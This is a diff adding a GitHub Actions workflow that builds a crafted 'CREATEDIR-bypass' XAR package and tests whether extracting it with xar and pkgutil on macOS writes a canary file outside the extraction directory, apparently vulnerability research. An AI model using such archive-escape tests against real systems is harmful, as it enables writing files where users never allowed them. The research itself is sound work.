@@ -1,0 +1,122 @@
+name: gate_a_nested_run38
+on:
+  workflow_dispatch:
+jobs:
+  gate_a_nested:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build CREATEDIR-bypass XAR archive
+        run: |
+          cc -o build_xar_r38 build_xar_r38.c -lz -framework Security
+          ./build_xar_r38
+          file gate_a38.pkg
+          echo "=== TOC XML ==="
+          python3 -c $'import zlib,struct,sys\nf=open("gate_a38.pkg","rb")\nhdr=f.read(28)\ntoc_cz_len=struct.unpack(">Q",hdr[8:16])[0]\ntoc_raw_len=struct.unpack(">Q",hdr[16:24])[0]\ntoc_cz=f.read(toc_cz_len)\nprint(zlib.decompress(toc_cz).decode())'
+
+      - name: System info
+        run: |
+          sw_vers
+          xar --version 2>&1 || true
+          echo "XAR binary: $(which xar)"
+          ls -la /tmp/ | head -20
+
+      - name: GATE A - xar CLI (isolated)
+        run: |
+          LOG="/tmp/run38_xar.log"
+          EXTRACT_DIR=$(mktemp -d /tmp/gate_a38_xar.XXXXXX)
+          CANARY_TMP=/tmp/xar_r38_subdir/xar_gated_canary_macos.txt
+          SUBDIR_TMP=/tmp/xar_r38_subdir
+
+          echo "=== GATE A xar PRE-CHECK ===" | tee "$LOG"
+          if [ -f "$CANARY_TMP" ]; then
+            echo "PRE_XAR=PRESENT (unexpected!)" | tee -a "$LOG"
+          else
+            echo "PRE_XAR=ABSENT" | tee -a "$LOG"
+          fi
+          if [ -d "$SUBDIR_TMP" ]; then
+            echo "PRE_SUBDIR=PRESENT (unexpected!)" | tee -a "$LOG"
+          else
+            echo "PRE_SUBDIR=ABSENT" | tee -a "$LOG"
+          fi
+
+          echo "=== GATE A xar EXTRACT ===" | tee -a "$LOG"
+          xar -xvf gate_a38.pkg -C "$EXTRACT_DIR" 2>&1 | tee -a "$LOG" || true
+          echo "xar exit: $?" | tee -a "$LOG"
+
+          echo "=== extraction dir ===" | tee -a "$LOG"
+          ls -laR "$EXTRACT_DIR" 2>&1 | tee -a "$LOG"
+
+          echo "=== /tmp subdir check ===" | tee -a "$LOG"
+          if [ -d "$SUBDIR_TMP" ]; then
+            echo "SUBDIR_CREATED_IN_TMP=YES" | tee -a "$LOG"
+            ls -la "$SUBDIR_TMP" 2>&1 | tee -a "$LOG"
+          else
+            echo "SUBDIR_CREATED_IN_TMP=NO" | tee -a "$LOG"
+          fi
+
+          echo "=== CANARY SEARCH ===" | tee -a "$LOG"
+          if [ -f "$CANARY_TMP" ]; then
+            echo "PRESENT" | tee -a "$LOG"
+            cat "$CANARY_TMP" | tee -a "$LOG"
+            echo "GATE_A_SYSXAR=PASS" | tee -a "$LOG"
+          else
+            echo "ABSENT" | tee -a "$LOG"
+            echo "GATE_A_SYSXAR=FAIL" | tee -a "$LOG"
+            exit 1
+          fi
+
+      - name: GATE A - pkgutil (always runs)
+        if: always()
+        run: |
+          LOG="/tmp/run38_pkgutil.log"
+          TMP_DIR=$(mktemp -d /tmp/gate_a38_pkgutil.XXXXXX)
+          CANARY_PKGUTIL="$TMP_DIR/out/d/link_to_tmp/xar_r38_subdir/xar_gated_canary_macos.txt"
+          CANARY_TMP=/tmp/xar_r38_subdir/xar_gated_canary_macos.txt
+          SUBDIR_TMP=/tmp/xar_r38_subdir
+
+          echo "=== GATE A pkgutil PRE-CHECK ===" | tee "$LOG"
+          if [ -f "$CANARY_TMP" ]; then
+            echo "PRE_PKGUTIL=PRESENT" | tee -a "$LOG"
+          else
+            echo "PRE_PKGUTIL=ABSENT" | tee -a "$LOG"
+          fi
+
+          echo "=== GATE A pkgutil EXPAND ===" | tee -a "$LOG"
+          pkgutil --expand gate_a38.pkg "$TMP_DIR/out" 2>&1 | tee -a "$LOG" || true
+
+          echo "=== pkgutil extraction dir ===" | tee -a "$LOG"
+          ls -laR "$TMP_DIR/out" 2>&1 | tee -a "$LOG" || true
+
+          echo "=== /tmp subdir after pkgutil ===" | tee -a "$LOG"
+          if [ -d "$SUBDIR_TMP" ]; then
+            echo "PKGUTIL_SUBDIR_IN_TMP=YES" | tee -a "$LOG"
+            ls -la "$SUBDIR_TMP" 2>&1 | tee -a "$LOG"
+          else
+            echo "PKGUTIL_SUBDIR_IN_TMP=NO" | tee -a "$LOG"
+          fi
+
+          echo "=== canary in /tmp ===" | tee -a "$LOG"
+          if [ -f "$CANARY_TMP" ]; then
+            echo "GATE_A_PKGUTIL=PASS" | tee -a "$LOG"
+            cat "$CANARY_TMP" | tee -a "$LOG"
+          else
+            echo "Step failing: GATE_A_PKGUTIL=FAIL" | tee -a "$LOG"
+            exit 1
+          fi
+
+      - name: Collect and push results
+        if: always()
+        run: |
+          cat /tmp/run38_xar.log /tmp/run38_pkgutil.log > run38_results.log 2>/dev/null || true
+          git add run38_results.log
+          git commit -m "Run 38 results — CREATEDIR-bypass Gate A [ci skip]" || true
+          git push "https://${{ secrets.GITHUB_TOKEN }}@github.com/YuvalFradkin1/new2.git" master || true
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: run38-createdir-bypass-macos26
+          path: run38_results.log
